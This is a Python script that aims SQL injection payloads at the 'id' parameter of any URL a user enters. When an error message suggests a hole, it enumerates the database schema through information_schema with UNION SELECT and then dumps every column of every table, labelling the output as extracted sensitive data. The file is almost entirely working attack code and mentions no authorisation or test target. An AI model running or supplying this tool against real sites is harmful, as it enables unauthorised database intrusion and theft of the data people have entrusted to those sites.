import requests
from bs4 import BeautifulSoup
import itertools

def test_sql_injection(url):
    base_payloads = [
        "' OR '1'='1", "' OR '1'='1' --", "' OR ''='", "' OR '1'='1' /*", "' OR '1'='1' #",
        "' OR 'x'='x", "' OR 1=1 --", "' OR '1'='1' -- -", "1' OR '1' = '1", "1' OR '1' = '1' -- -",
        "' OR 'a'='a", "' OR 1=1#", "' OR 1=1/*", "' OR 'text'='text", "' OR 1=1--",
        "1 OR 1=1", "' OR 1=1#", "' OR 1=1;", "' OR 'x'='x' --", "' OR ''=' --",
        "' OR 'a'='a", "' OR '1'='1' --", "' OR '1'='1' #", "' OR 'x'='x", "' OR 1=1 --",
        "' OR '1'='1' -- -", "1' OR '1' = '1", "1' OR '1' = '1' -- -", "' OR 'a'='a",
        "' OR 1=1#", "' OR 1=1/*", "' OR 'text'='text", "' OR 1=1--", "1 OR 1=1",
        "' OR 1=1#", "' OR 1=1;", "' OR 'x'='x' --", "' OR ''=' --"
    ]

    additional_payloads = ["' AND 'x'='x", "' AND 1=1 --", "' AND '1'='1", "' AND 'text'='text", "1' AND '1'='1"]

    # Generate more payloads by combining base payloads with additional payloads
    combined_payloads = list(itertools.product(base_payloads, additional_payloads))
    all_payloads = base_payloads + additional_payloads + [a + b for a, b in combined_payloads]

    # Extend the list of payloads to 1000 by repeating the pattern
    all_payloads = (all_payloads * (1000 // len(all_payloads) + 1))[:1000]

    for payload in all_payloads:
        try:
            encoded_payload = requests.utils.quote(payload)
            test_url = f"{url}?id={encoded_payload}"
            
            response = requests.get(test_url)
            response.raise_for_status()
            
            if any(keyword in response.text.lower() for keyword in ["sql", "syntax", "mysql", "exception", "error"]):
                print(f"Possible SQL injection vulnerability found with payload: {payload}")
                print(f"URL: {test_url}")
                analyze_sql_injection(url, payload)
                return True
        except requests.RequestException as e:
            print(f"Error occurred while testing payload {payload}: {e}")
    
    return False

def analyze_sql_injection(url, payload):
    try:
        test_payload = f"' UNION SELECT table_name, column_name FROM information_schema.columns --"
        encoded_payload = requests.utils.quote(test_payload)
        test_url = f"{url}?id={encoded_payload}"
        response = requests.get(test_url)
        if response.status_code == 200:
            tables_columns = parse_tables_columns(response.text)
            print("Tables and Columns in the Database:")
            print(tables_columns)
            extract_sensitive_data(url, tables_columns)
    except requests.RequestException as e:
        print(f"Error occurred during additional analysis: {e}")

def parse_tables_columns(response_text):
    tables_columns = {}  
    soup = BeautifulSoup(response_text, 'html.parser')
    for table in soup.find_all('table'):
        for row in table.find_all('tr'):
            columns = row.find_all('td')
            if len(columns) > 1:
                table_name = columns[0].text.strip()
                column_name = columns[1].text.strip()
                if table_name not in tables_columns:
                    tables_columns[table_name] = []
                tables_columns[table_name].append(column_name)
    return tables_columns

def extract_sensitive_data(url, tables_columns):
    for table, columns in tables_columns.items():
        for column in columns:
            try:
                test_payload = f"' UNION SELECT {column} FROM {table} --"
                encoded_payload = requests.utils.quote(test_payload)
                test_url = f"{url}?id={encoded_payload}"
                response = requests.get(test_url)
                if response.status_code == 200:
                    print(f"Sensitive data extracted from table '{table}', column '{column}':")
                    print(response.text)
            except requests.RequestException as e:
                print(f"Error occurred while extracting data from table '{table}', column '{column}': {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    if test_sql_injection(target_url):
        print("Vulnerability detected.")
    else:
        print("No vulnerability detected.")
